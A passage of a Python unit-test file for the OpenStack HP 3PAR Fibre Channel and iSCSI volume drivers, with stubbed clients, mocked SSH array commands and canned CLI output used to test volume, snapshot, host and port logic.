        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}

    def fake_get_volume_type(self, type_id):
        return self.volume_type

    def fake_get_qos_by_volume_type(self, volume_type):
        return self.QOS

    def fake_add_volume_to_volume_set(self, volume, volume_name,
                                      cpg, vvs_name, qos):
        return volume

    def fake_copy_volume(self, src_name, dest_name, cpg=None,
                         snap_cpg=None, tpvv=True):
        pass

    def fake_get_volume_stats(self, vol_name):
        return ""normal""

    def fake_get_volume_settings_from_type(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': self.VVS_NAME,
                'qos': self.QOS,
                'tpvv': True,
                'volume_type': self.volume_type}

    def fake_get_volume_settings_from_type_noqos(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': None,
                'qos': None,
                'tpvv': True,
                'volume_type': None}

    def test_create_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type_noqos)
        self.driver.create_volume(self.volume)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)

    def test_create_volume_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume(self.volume_qos)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)

        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))

    def test_delete_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.driver.delete_volume(self.volume)
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.VOLUME_ID)

    def test_create_cloned_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_copy_volume"",
                       self.fake_copy_volume)
        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,
                  'id': HP3PARBaseDriver.CLONE_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': HP3PARBaseDriver.FAKE_HOST,
                  'source_volid': HP3PARBaseDriver.VOLUME_ID}
        src_vref = {}
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertTrue(model_update is not None)

    def test_create_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_snapshot(self.snapshot)

        # check to see if the snapshot was created
        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)

    def test_delete_snapshot(self):
        self.flags(lock_path=self.tempdir)

        self.driver.create_snapshot(self.snapshot)
        #make sure it exists first
        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)
        self.driver.delete_snapshot(self.snapshot)

        # the snapshot should be deleted now
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.SNAPSHOT_3PAR_NAME)

    def test_create_volume_from_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)

        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_create_volume_from_snapshot_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_volume_type"",
                       self.fake_get_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_get_qos_by_volume_type"",
                       self.fake_get_qos_by_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)
        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_terminate_connection(self):
        self.flags(lock_path=self.tempdir)
        #setup the connections
        self.driver.initialize_connection(self.volume, self.connector)
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)
        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)
        self.driver.terminate_connection(self.volume, self.connector,
                                         force=True)
        # vlun should be gone.
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVLUN,
                          self.VOLUME_3PAR_NAME)

    def test_extend_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.UnsetAll()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""extend_volume"",
                       self.fake_extend_volume)
        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}
        self.driver.common.client.createVolume(self.volume['name'],
                                               HP3PAR_CPG,
                                               self.volume['size'],
                                               option)
        old_size = self.volume['size']
        volume = self.driver.common.client.getVolume(self.volume['name'])
        self.driver.extend_volume(volume, str(old_size + 1))
        vol = self.driver.common.client.getVolume(self.volume['name'])
        self.assertEqual(vol['sizeMiB'], str(old_size + 1))


class TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARFCDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARFCDriver, self).setup_fakes()
        self.stubs.Set(hpfcdriver.HP3PARFCDriver,
                       ""_create_3par_fibrechan_host"",
                       self.fake_create_3par_fibrechan_host)

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        super(TestHP3PARFCDriver, self).tearDown()

    def setup_driver(self, configuration):
        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_fibrechan_host(self, hostname, wwn,
                                        domain, persona_id):
        host = {'FCPaths': [{'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 1,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[0]},
                            {'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 0,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[1]}],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'fibre_channel'}
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'fibre_channel')

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        create_host_ret = pack(CLI_CR +
                               'already used by host fakehost.foo (19)')
        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])

        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',
                           '123456789054321']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)


class TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):

    TARGET_IQN = ""iqn.2000-05.com.3pardata:21810002ac00383d""

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARISCSIDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARISCSIDriver, self).setup_fakes()

        self.stubs.Set(hpdriver.HP3PARISCSIDriver, ""_create_3par_iscsi_host"",
                       self.fake_create_3par_iscsi_host)

        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_iqn': self.TARGET_IQN,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'iscsi'}

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        self._hosts = {}
        super(TestHP3PARISCSIDriver, self).tearDown()

    def setup_driver(self, configuration, set_up_fakes=True):
        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)

        if set_up_fakes:
            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                           self.fake_get_ports)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,
                                    domain, persona_id):
        host = {'FCPaths': [],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [{'driverVersion': None,
                                'firmwareVersion': None,
                                'hostSpeed': 0,
                                'ipAddr': '10.10.221.59',
                                'model': None,
                                'name': iscsi_iqn,
                                'portPos': {'cardPort': 1, 'node': 1,
                                            'slot': 8},
                                'vendor': None}],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'iscsi')
        self.assertEqual(result['data']['target_iqn'],
                         self.properties['data']['target_iqn'])
        self.assertEqual(result['data']['target_portal'],
                         self.properties['data']['target_portal'])
        self.assertEqual(result['data']['target_discovered'],
                         self.properties['data']['target_discovered'])

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                           ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        in_use_ret = pack('\r\nalready used by host fakehost.foo ')
        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])

        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',
                           'iqn.1993-08.org.debian:01:222']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_get_ports(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),
                                                    ''])
        self.mox.ReplayAll()

        ports = self.driver.common.get_ports()
        self.assertEqual(ports['FC'][0], '20210002AC00383D')
        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')

    def test_get_iscsi_ip_active(self):
        self.flags(lock_path=self.tempdir)

        #record set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])

        self.mox.ReplayAll()

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.253')

    def test_get_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        #record
        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        show_vlun_ret = 'no vluns listed\r\n'
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])
        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.iscsi_ip_address = '10.10.10.10'
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.252')

    def test_invalid_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']
        config.iscsi_ip_address = '10.10.10.10'
        self.mox.ReplayAll()

        # no valid ip addr should be configured.
        self.assertRaises(exception.InvalidInput,
                          self.setup_driver,
                          config,
                          set_up_fakes=False)

    def test_get_least_used_nsp(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()
        # in use count                           11       12
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])
        self.assertEqual(nsp, '0:2:1')

        # in use count                            11       10
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])
        self.assertEqual(nsp, '1:2:1')

        # in use count                            0       10
        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])
        self.assertEqual(nsp, '1:1:1')


def pack(arg):
    header = '\r\n\r\n\r\n\r\n\r\n'
    footer = '\r\n\r\n\r\n'
    return header + arg + footer

FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

FC_SHOWHOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

NO_FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_NO_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_PORT_IDS_RET = (
    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\r\n'
